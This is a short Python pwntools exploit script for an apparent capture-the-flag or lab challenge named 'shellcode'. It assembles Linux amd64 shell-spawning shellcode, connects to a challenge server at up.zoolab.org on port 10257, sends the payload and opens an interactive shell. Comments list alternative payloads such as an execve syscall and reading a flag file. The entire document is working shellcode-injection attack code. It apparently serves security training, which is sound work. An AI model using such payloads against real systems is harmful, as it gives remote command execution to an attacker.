#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *
import sys

context.arch = 'amd64'
context.os = 'linux'

exe = './shellcode'
port = 10257

elf = ELF(exe)
off_main = elf.symbols[b'main']
base = 0
qemu_base = 0

# asm code: xor eax, eax; mov al, 0x3b; xor edi, edi; xor esi, esi; xor edx, edx; syscall
# shellcraft code: shellcraft.amd64.linux.syscall('SYS_execve', 'rsp', 0, 0)
# shellcraft code: shellcraft.amd64.linux.sh()
# shellcraft code: shellcraft.amd64.linux.cat('flag')

code = asm(shellcraft.sh())
print(code)

r = None
if 'local' in sys.argv[1:]:
    r = process(exe, shell=False)
elif 'qemu' in sys.argv[1:]:
    qemu_base = 0x4000000000
    r = process(f'qemu-x86_64-static {exe}', shell=True)
else:
    r = remote('up.zoolab.org', port)
    recv = r.recvline().decode('utf-8')
    code = asm(shellcraft.sh())
    r.sendline(code)
    # recv = r.recvuntil(b"code> \n", drop=False).decode('utf-8')
    

r.interactive()

# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :